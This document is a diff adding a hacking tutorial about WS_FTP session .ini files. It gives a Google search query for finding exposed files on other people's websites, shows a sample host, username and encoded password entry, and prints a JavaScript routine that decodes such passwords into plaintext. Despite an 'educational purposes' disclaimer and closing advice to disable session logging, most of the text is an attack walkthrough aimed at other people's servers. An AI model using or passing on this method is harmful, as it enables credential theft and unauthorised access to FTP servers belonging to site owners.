@@ -1,0 +1,52 @@
+Using this bug, can lead to the host, username, and password of a website, enabling the hacker to gain access to their ftp server.
+
+First off, this article is for educational purposes only, and to let WS_FTP users know they are vulnerable. WS_FTP (Pro) keeps copies of sessions on your server. They are just small .Ini files that store things like the time you logged in, your username, server, and password. The first step is to find a sample site. Go ahead and open up google (I hope you know what that is), and search for "[_config_] SESSION=, WS_FTP". You should get a bundle of results back, about %50 of these are probably vulnerable. Go ahead and open one up. Scan through it, and you should notice a few important things, mainly that there is a password in there. You should see something related to:
+
+HOST=www.xxx.org
+UID=manurse
+PWD=7A66653C3C3C69
+
+Now, from instinct you should realize that this is of course encrypted. Not to fear, we have an easy
+
+algroithim to break this:
+
+
+
+script language="Javascript" type="text/javascript"
+function wsFTP_decoder(myString) {
+if (myString.indexOf('PWD=', 0) == -1 || myString.length-37<0)
+{
+alert("ENTRY NOT VALID: be sure to enter the whole line, including 'PWD='");
+}
+else
+{
+myPassword=myString.substring(37,myString.length);
+
+var x= "";
+
+for (var i = 0; i<myPassword.length/2; i++)
+{
+document.forms[0].decoded_entry.value = "";
+
+var myCharacter=myPassword.substring(i*2,i*2+2);
+var myParsed=myString.substring(5+i,6+i);
+var myClearText=parseInt("0x"+myCharacter) -i -1 -((47+parseInt("0x"+myParsed))%57);
+x = x+String.fromCharCode(myClearText);
+
+document.forms[0].decoded_entry.value = x;
+}
+}
+}
+/script
+
+Adding the proper tags to that. You can run this in a page, or translate it to another language if you would
+
+like, either way you should come out with the plain text password. From research and alot of testing I have
+
+come up with about %50 actually work due to outdated material or invalid data.
+
+Either way this can be very dangerous if someone actually get's ahold if this .Ini file on your server, so I
+
+highly suggest turning the logging sessions off, or simply deleting the file after your done with the session.
+
+I hope this word spreads more to warn other WS_FTP users that they may be vulnerable.
